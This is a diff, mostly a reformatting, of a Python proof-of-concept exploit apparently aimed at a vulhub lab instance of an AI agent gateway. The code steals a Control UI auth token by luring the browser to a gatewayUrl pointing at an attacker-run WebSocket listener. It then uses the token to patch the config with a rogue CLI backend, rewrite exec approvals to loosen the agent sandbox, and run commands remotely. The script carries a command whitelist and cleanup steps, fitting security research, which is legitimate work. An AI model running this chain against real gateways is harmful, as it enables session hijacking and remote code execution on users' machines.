@@ -28,7 +28,9 @@ if sys.version_info < (3, 8):
 try:
     import websockets
 except ImportError:
-    sys.stderr.write("[-] 'websockets' package not installed. Run: pip3 install websockets\n")
+    sys.stderr.write(
+        "[-] 'websockets' package not installed. Run: pip3 install websockets\n"
+    )
     sys.exit(1)
 
 
@@ -148,12 +150,16 @@ async def listen_for_token(host, port, got_token, timeout=120):
 
     try:
         await asyncio.wait_for(got_token.wait(), timeout=timeout)
-    except asyncio.TimeoutError:
+    except TimeoutError:
         print(f"\n[!] Token capture timed out after {timeout}s")
         print("[!] Minimum troubleshooting checklist:")
-        print(f"    1. Listener address/port: ws://{host}:{port} — verify it is reachable")
+        print(
+            f"    1. Listener address/port: ws://{host}:{port} — verify it is reachable"
+        )
         print("    2. Browser session: ensure Control UI is open and connected")
-        print("    3. Trigger URL: open the trigger URL in the SAME browser as Control UI")
+        print(
+            "    3. Trigger URL: open the trigger URL in the SAME browser as Control UI"
+        )
         print("    4. Trigger method: navigate directly (not via fetch/XHR)")
         print("    5. Firewall: ensure no firewall blocks the listener port")
         server.close()
@@ -168,6 +174,7 @@ async def listen_for_token(host, port, got_token, timeout=120):
 async def _recv_response(ws, msg_id, timeout=10, max_attempts=10):
     """Wait for a specific response by id from the WebSocket."""
     import websockets.exceptions
+
     for _ in range(max_attempts):
         try:
             raw = await asyncio.wait_for(ws.recv(), timeout=timeout)
@@ -177,7 +184,7 @@ async def _recv_response(ws, msg_id, timeout=10, max_attempts=10):
         except websockets.exceptions.ConnectionClosedError:
             # Connection was closed (e.g. gateway restart with 1012)
             break
-        except (asyncio.TimeoutError, TimeoutError, json.JSONDecodeError):
+        except (TimeoutError, json.JSONDecodeError):
             continue
     return None
 
@@ -188,10 +195,11 @@ async def _drain_events(ws, timeout=2):
     restarts after config.patch and closes the connection with 1012.
     """
     import websockets.exceptions
+
     while True:
         try:
             await asyncio.wait_for(ws.recv(), timeout=timeout)
-        except (asyncio.TimeoutError, TimeoutError):
+        except TimeoutError:
             break
         except websockets.exceptions.ConnectionClosedError:
             break
@@ -216,9 +224,13 @@ async def _connect_and_authenticate(target, token_data, quiet=False):
         try:
             ws = await asyncio.wait_for(websockets.connect(uri), timeout=5)
             break
-        except (OSError, ConnectionRefusedError, asyncio.TimeoutError,
-                websockets.exceptions.InvalidMessage,
-                websockets.exceptions.ConnectionClosedError) as exc:
+        except (
+            TimeoutError,
+            OSError,
+            ConnectionRefusedError,
+            websockets.exceptions.InvalidMessage,
+            websockets.exceptions.ConnectionClosedError,
+        ) as exc:
             if not quiet:
                 print(f"[*] Connection attempt {attempt + 1}/5 failed: {exc}")
             if attempt < 4:
@@ -287,7 +299,11 @@ async def _do_config_get(ws):
 
     config_resp = await _recv_response(ws, config_get_msg["id"])
     if not config_resp or not config_resp.get("ok"):
-        err = config_resp.get("error", {}).get("message", "unknown") if config_resp else "no response"
+        err = (
+            config_resp.get("error", {}).get("message", "unknown")
+            if config_resp
+            else "no response"
+        )
         print(f"[-] config.get failed: {err}")
         return None, None
 
@@ -315,15 +331,13 @@ async def _do_config_patch(ws, base_hash, cli_backend_id, cli_backend_config):
     # merged into the existing config via applyMergePatch().
     # We must NOT use a `config` key — additionalProperties: false.
     config_patch_payload = {
-        "raw": json.dumps({
-            "agents": {
-                "defaults": {
-                    "cliBackends": {
-                        cli_backend_id: cli_backend_config
-                    }
+        "raw": json.dumps(
+            {
+                "agents": {
+                    "defaults": {"cliBackends": {cli_backend_id: cli_backend_config}}
                 }
             }
-        }),
+        ),
     }
     if base_hash:
         config_patch_payload["baseHash"] = base_hash
@@ -338,7 +352,11 @@ async def _do_config_patch(ws, base_hash, cli_backend_id, cli_backend_config):
 
     patch_resp = await _recv_response(ws, config_patch_msg["id"])
     if not patch_resp or not patch_resp.get("ok"):
-        err = patch_resp.get("error", {}).get("message", "unknown") if patch_resp else "no response"
+        err = (
+            patch_resp.get("error", {}).get("message", "unknown")
+            if patch_resp
+            else "no response"
+        )
         print(f"[-] config.patch failed: {err}")
         return False
 
@@ -351,14 +369,23 @@ async def _do_exec_approvals_set(ws, approvals_hash, existing_file):
     """
     # Must first call exec.approvals.get to obtain the current
     # snapshot hash, then pass it as baseHash for conflict check.
-    await ws.send(json.dumps({
-        "type": "req", "id": f"poc-exec-approvals-get-{uuid4().hex[:8]}",
-        "method": "exec.approvals.get",
-        "params": {},
-    }))
-    approvals_get_resp = await _recv_response(ws, f"poc-exec-approvals-get")
+    await ws.send(
+        json.dumps(
+            {
+                "type": "req",
+                "id": f"poc-exec-approvals-get-{uuid4().hex[:8]}",
+                "method": "exec.approvals.get",
+                "params": {},
+            }
+        )
+    )
+    approvals_get_resp = await _recv_response(ws, "poc-exec-approvals-get")
     if not approvals_get_resp or not approvals_get_resp.get("ok"):
-        err = approvals_get_resp.get("error", {}).get("message", "unknown") if approvals_get_resp else "no response"
+        err = (
+            approvals_get_resp.get("error", {}).get("message", "unknown")
+            if approvals_get_resp
+            else "no response"
+        )
         print(f"[-] exec.approvals.get failed: {err}")
         return False
 
@@ -398,8 +425,16 @@ async def _do_exec_approvals_set(ws, approvals_hash, existing_file):
 
     approvals_resp = await _recv_response(ws, exec_approvals_msg["id"])
     if not approvals_resp or not approvals_resp.get("ok"):
-        err = approvals_resp.get("error", {}).get("message", "unknown") if approvals_resp else "no response"
-        err_code = approvals_resp.get("error", {}).get("code", "N/A") if approvals_resp else "N/A"
+        err = (
+            approvals_resp.get("error", {}).get("message", "unknown")
+            if approvals_resp
+            else "no response"
+        )
+        err_code = (
+            approvals_resp.get("error", {}).get("code", "N/A")
+            if approvals_resp
+            else "N/A"
+        )
         print(f"[-] exec.approvals.set failed: [{err_code}] {err}")
         print("[!] This means the sandbox policy cannot be updated.")
         print("[!] Possible causes:")
@@ -433,7 +468,9 @@ async def _do_agent_exec(ws, command):
     }
     await ws.send(json.dumps(agent_exec_msg))
 
-    agent_resp = await _recv_response(ws, agent_exec_msg["id"], timeout=15, max_attempts=15)
+    agent_resp = await _recv_response(
+        ws, agent_exec_msg["id"], timeout=15, max_attempts=15
+    )
     if not agent_resp:
         print("[-] No response from agent execution request")
         return False, None, "no response from agent request"
@@ -471,6 +508,7 @@ async def _wait_for_gateway_restart(target, max_wait=30, token_data=None):
         If token_data is provided: (ws, server_info) on success, (None, None) on failure.
     """
     import websockets.exceptions
+
     parsed = urlparse(target)
     gw_host = parsed.hostname or "127.0.0.1"
     gw_port = parsed.port or 18789
@@ -497,7 +535,11 @@ async def _wait_for_gateway_restart(target, max_wait=30, token_data=None):
                     "method": "connect",
                     "params": {
                         "auth": {"token": "probe"},
-                        "client": {"id": "cli", "version": "1.0.0", "platform": "linux"},
+                        "client": {
+                            "id": "cli",
+                            "version": "1.0.0",
+                            "platform": "linux",
+                        },
                     },
                 }
                 await asyncio.wait_for(ws.send(json.dumps(test_msg)), timeout=2)
@@ -518,13 +560,23 @@ async def _wait_for_gateway_restart(target, max_wait=30, token_data=None):
 
                         # Auto re-authenticate if token_data is provided
                         if token_data is not None:
-                            auth_ws, auth_info = await _connect_and_authenticate(target, token_data, quiet=True)
+                            auth_ws, auth_info = await _connect_and_authenticate(
+                                target, token_data, quiet=True
+                            )
                             if auth_ws is None:
-                                print("[-] Auto re-authentication failed after gateway restart")
+                                print(
+                                    "[-] Auto re-authentication failed after gateway restart"
+                                )
                                 print("[!] Troubleshooting:")
-                                print("    1. The stolen token may have expired after gateway restart")
-                                print("    2. Re-run the PoC from the token capture stage")
-                                print("    3. Check if the gateway rotated secrets during restart")
+                                print(
+                                    "    1. The stolen token may have expired after gateway restart"
+                                )
+                                print(
+                                    "    2. Re-run the PoC from the token capture stage"
+                                )
+                                print(
+                                    "    3. Check if the gateway rotated secrets during restart"
+                                )
                                 return None, None
                             await asyncio.sleep(1)
                             await _drain_events(auth_ws)
@@ -543,7 +595,7 @@ async def _wait_for_gateway_restart(target, max_wait=30, token_data=None):
                     await ws.close()
                 except Exception:
                     pass
-            except (asyncio.TimeoutError, TimeoutError, json.JSONDecodeError):
+            except (TimeoutError, json.JSONDecodeError):
                 # Gateway is responding slowly — not stable yet
                 stable_since = None
                 try:
@@ -553,16 +605,12 @@ async def _wait_for_gateway_restart(target, max_wait=30, token_data=None):
         except websockets.exceptions.InvalidStatus:
             # HTTP 503 — gateway still restarting
             stable_since = None
-            pass
         except websockets.exceptions.InvalidMessage:
             # Invalid HTTP response — gateway still restarting
             stable_since = None
-            pass
-        except (asyncio.TimeoutError, TimeoutError, ConnectionRefusedError,
-                OSError):
+        except (TimeoutError, ConnectionRefusedError, OSError):
             # Port not open — gateway still restarting
             stable_since = None
-            pass
         await asyncio.sleep(1)
 
 
@@ -578,10 +626,16 @@ async def _restore_clibackends(target, token_data, cli_backend_id, existing_ws=N
         # Attempt to connect with retry — gateway may still be restarting
         # after config.patch. Use _wait_for_gateway_restart which handles
         # InvalidMessage / ConnectionRefused / 1012 close frames.
-        ws, _ = await _wait_for_gateway_restart(target, max_wait=30, token_data=token_data)
+        ws, _ = await _wait_for_gateway_restart(
+            target, max_wait=30, token_data=token_data
+        )
         if ws is None:
-            print("[-] Failed to reconnect for restore (gateway may still be restarting)")
-            print("[!] Manual cleanup may be needed: remove the poc-cli cliBackend from config")
+            print(
+                "[-] Failed to reconnect for restore (gateway may still be restarting)"
+            )
+            print(
+                "[!] Manual cleanup may be needed: remove the poc-cli cliBackend from config"
+            )
             return
         should_close = True
 
@@ -594,15 +648,9 @@ async def _restore_clibackends(target, token_data, cli_backend_id, existing_ws=N
 
     # Remove the poc-cli backend by setting it to null
     restore_payload = {
-        "raw": json.dumps({
-            "agents": {
-                "defaults": {
-                    "cliBackends": {
-                        cli_backend_id: None
-                    }
-                }
-            }
-        }),
+        "raw": json.dumps(
+            {"agents": {"defaults": {"cliBackends": {cli_backend_id: None}}}}
+        ),
     }
     if new_base_hash:
         restore_payload["baseHash"] = new_base_hash
@@ -616,8 +664,12 @@ async def _restore_clibackends(target, token_data, cli_backend_id, existing_ws=N
     try:
         await ws.send(json.dumps(restore_msg))
     except websockets.exceptions.ConnectionClosedError:
-        print("[-] Connection lost during restore — config.patch may trigger another restart")
-        print("[!] Manual cleanup may be needed: remove the poc-cli cliBackend from config")
+        print(
+            "[-] Connection lost during restore — config.patch may trigger another restart"
+        )
+        print(
+            "[!] Manual cleanup may be needed: remove the poc-cli cliBackend from config"
+        )
         if should_close:
             try:
                 await ws.close()
@@ -651,7 +703,9 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
     """
 
     if command not in SAFE_COMMAND_WHITELIST:
-        print(f"[-] Command '{command}' is not in the whitelist: {SAFE_COMMAND_WHITELIST}")
+        print(
+            f"[-] Command '{command}' is not in the whitelist: {SAFE_COMMAND_WHITELIST}"
+        )
         print("[-] Refusing to execute for safety reasons")
         return
 
@@ -698,7 +752,9 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
     # -------------------------------------------------------
     ws, server_info = await _wait_for_gateway_restart(target, token_data=token_data)
     if ws is None:
-        print("[-] Cannot continue — gateway did not restart or re-authentication failed")
+        print(
+            "[-] Cannot continue — gateway did not restart or re-authentication failed"
+        )
         return
 
     # -------------------------------------------------------
@@ -708,10 +764,16 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
     # Get exec.approvals snapshot first (required for exec.approvals.set)
     ea_get_id = f"poc-exec-approvals-get-{uuid4().hex[:8]}"
     try:
-        await ws.send(json.dumps({
-            "type": "req", "id": ea_get_id,
-            "method": "exec.approvals.get", "params": {},
-        }))
+        await ws.send(
+            json.dumps(
+                {
+                    "type": "req",
+                    "id": ea_get_id,
+                    "method": "exec.approvals.get",
+                    "params": {},
+                }
+            )
+        )
     except websockets.exceptions.ConnectionClosedError:
         # Connection closed during send — gateway may still be restarting.
         # Wait and reconnect.
@@ -722,30 +784,48 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
             pass
         ws, server_info = await _wait_for_gateway_restart(target, token_data=token_data)
         if ws is None:
-            print("[-] Cannot continue — gateway did not restart or re-authentication failed")
+            print(
+                "[-] Cannot continue — gateway did not restart or re-authentication failed"
+            )
             return
         # Retry exec.approvals.get
         ea_get_id = f"poc-exec-approvals-get-{uuid4().hex[:8]}"
         try:
-            await ws.send(json.dumps({
-                "type": "req", "id": ea_get_id,
-                "method": "exec.approvals.get", "params": {},
-            }))
+            await ws.send(
+                json.dumps(
+                    {
+                        "type": "req",
+                        "id": ea_get_id,
+                        "method": "exec.approvals.get",
+                        "params": {},
+                    }
+                )
+            )
         except websockets.exceptions.ConnectionClosedError:
             print("[-] Failed to send request after reconnection")
             await ws.close()
             return
     approvals_get_resp = await _recv_response(ws, ea_get_id)
     if not approvals_get_resp or not approvals_get_resp.get("ok"):
-        err = approvals_get_resp.get("error", {}).get("message", "unknown") if approvals_get_resp else "no response"
-        err_code = approvals_get_resp.get("error", {}).get("code", "N/A") if approvals_get_resp else "N/A"
+        err = (
+            approvals_get_resp.get("error", {}).get("message", "unknown")
+            if approvals_get_resp
+            else "no response"
+        )
+        err_code = (
+            approvals_get_resp.get("error", {}).get("code", "N/A")
+            if approvals_get_resp
+            else "N/A"
+        )
         print(f"[-] exec.approvals.get failed: [{err_code}] {err}")
         print("[!] This means the gateway cannot return the current sandbox policy.")
         print("[!] Possible causes:")
         print("    1. The re-authenticated session lacks operator privileges")
         print("    2. The gateway's internal state is inconsistent after restart")
         print("    3. The exec.approvals subsystem is not initialized yet")
-        print("[!] Suggestion: Re-run from token capture stage or wait longer after restart")
+        print(
+            "[!] Suggestion: Re-run from token capture stage or wait longer after restart"
+        )
         await ws.close()
         return
 
@@ -785,8 +865,16 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
 
     approvals_resp = await _recv_response(ws, exec_approvals_msg["id"])
     if not approvals_resp or not approvals_resp.get("ok"):
-        err = approvals_resp.get("error", {}).get("message", "unknown") if approvals_resp else "no response"
-        err_code = approvals_resp.get("error", {}).get("code", "N/A") if approvals_resp else "N/A"
+        err = (
+            approvals_resp.get("error", {}).get("message", "unknown")
+            if approvals_resp
+            else "no response"
+        )
+        err_code = (
+            approvals_resp.get("error", {}).get("code", "N/A")
+            if approvals_resp
+            else "N/A"
+        )
         print(f"[-] exec.approvals.set failed: [{err_code}] {err}")
         print("[!] This means the sandbox policy cannot be updated.")
         print("[!] Possible causes:")
@@ -797,7 +885,6 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
         await ws.close()
         return
 
-
     # Drain buffered events before closing this connection
     await _drain_events(ws)
 
@@ -807,7 +894,7 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
     try:
         # Try a ping to check if the connection is still alive
         pong = await asyncio.wait_for(ws.ping(), timeout=2)
-    except (websockets.exceptions.ConnectionClosedError, asyncio.TimeoutError):
+    except (TimeoutError, websockets.exceptions.ConnectionClosedError):
         connection_alive = False
 
     if not connection_alive:
@@ -820,7 +907,9 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
         # Wait for gateway to restart (auto re-authenticate)
         ws, server_info = await _wait_for_gateway_restart(target, token_data=token_data)
         if ws is None:
-            print("[-] Cannot continue — gateway did not restart or re-authentication failed")
+            print(
+                "[-] Cannot continue — gateway did not restart or re-authentication failed"
+            )
             return
     else:
         pass  # connection still alive
@@ -854,9 +943,15 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
 
     sessions_patch_resp = await _recv_response(ws, sessions_patch_msg["id"])
     if not sessions_patch_resp or not sessions_patch_resp.get("ok"):
-        err = sessions_patch_resp.get("error", {}).get("message", "unknown") if sessions_patch_resp else "no response"
+        err = (
+            sessions_patch_resp.get("error", {}).get("message", "unknown")
+            if sessions_patch_resp
+            else "no response"
+        )
         print(f"[-] sessions.patch failed: {err}")
-        print("[!] CLI backend path not effective — agent fell back to default provider")
+        print(
+            "[!] CLI backend path not effective — agent fell back to default provider"
+        )
         print("[!] This means the session will try to use an LLM API (e.g. anthropic),")
         print("[!] which is unavailable in the lab environment. RCE will not succeed.")
     else:
@@ -880,8 +975,17 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
             await asyncio.sleep(attempt_delay)
             try:
                 result = subprocess.run(
-                    ["docker", "compose", "exec", "web", "cat", "/tmp/vulhub_rce_proof"],
-                    capture_output=True, text=True, timeout=10,
+                    [
+                        "docker",
+                        "compose",
+                        "exec",
+                        "web",
+                        "cat",
+                        "/tmp/vulhub_rce_proof",
+                    ],
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
                     cwd=script_dir,
                 )
                 if result.returncode == 0 and result.stdout.strip():
@@ -918,14 +1022,31 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
         if agent_error:
             print(f"[-] agent error: {agent_error}")
             # Detect if agent fell back to default provider (LLM API key error)
-            api_key_indicators = ["api key", "apikey", "api_key", "anthropic", "openai", "provider", "model not found", "no provider"]
-            if any(indicator in agent_error.lower() for indicator in api_key_indicators):
-                print("[!] CLI backend path not effective — agent fell back to default provider")
-                print("[!] The sessions.patch may not have taken effect, or the CLI backend ID is incorrect")
-                print("[!] Suggestion: verify cliBackend config was applied after gateway restart")
+            api_key_indicators = [
+                "api key",
+                "apikey",
+                "api_key",
+                "anthropic",
+                "openai",
+                "provider",
+                "model not found",
+                "no provider",
+            ]
+            if any(
+                indicator in agent_error.lower() for indicator in api_key_indicators
+            ):
+                print(
+                    "[!] CLI backend path not effective — agent fell back to default provider"
+                )
+                print(
+                    "[!] The sessions.patch may not have taken effect, or the CLI backend ID is incorrect"
+                )
+                print(
+                    "[!] Suggestion: verify cliBackend config was applied after gateway restart"
+                )
         if not rce_output:
             print("[!] 链路未完全验证 — proof file empty")
-            print(f"[*] Manual check: docker compose exec web cat /tmp/vulhub_rce_proof")
+            print("[*] Manual check: docker compose exec web cat /tmp/vulhub_rce_proof")
         print()
 
     # -------------------------------------------------------
@@ -943,6 +1064,7 @@ async def exploit_rce(target, token_data, command=SAFE_COMMAND):
         print("[[+]] RCE chain verification PASSED")
     else:
         print("[-] RCE chain verification FAILED")
+
 
 async def main():
     parser = argparse.ArgumentParser(
@@ -962,13 +1084,13 @@ async def main():
         "--cmd",
         default=SAFE_COMMAND,
         help=f"Command to execute for --rce (default: '{SAFE_COMMAND}'). "
-             f"Whitelist: {SAFE_COMMAND_WHITELIST}",
+        f"Whitelist: {SAFE_COMMAND_WHITELIST}",
     )
     parser.add_argument(
         "--token",
         default=None,
         help="CoNote-captured JSON string (skips WebSocket listener, "
-             "parses params.auth.token directly for auth/RCE)",
+        "parses params.auth.token directly for auth/RCE)",
     )
     parser.add_argument(
         "--host",
@@ -988,7 +1110,9 @@ async def main():
     print("=" * 60)
 
     if args.rce and args.cmd not in SAFE_COMMAND_WHITELIST:
-        print(f"\n[-] Command '{args.cmd}' is not in the whitelist: {SAFE_COMMAND_WHITELIST}")
+        print(
+            f"\n[-] Command '{args.cmd}' is not in the whitelist: {SAFE_COMMAND_WHITELIST}"
+        )
         print("[-] Refusing to execute for safety reasons")
         sys.exit(1)
 
@@ -1028,7 +1152,9 @@ async def main():
 
     trigger_url = f"{args.target}/?gatewayUrl=ws://{args.host}:{args.port}"
 
-    print("Open the following URL in the SAME browser where the Control UI is active (open a new tab):")
+    print(
+        "Open the following URL in the SAME browser where the Control UI is active (open a new tab):"
+    )
     print()
     print(f"\033[1;36m{trigger_url}\033[0m")
     print()
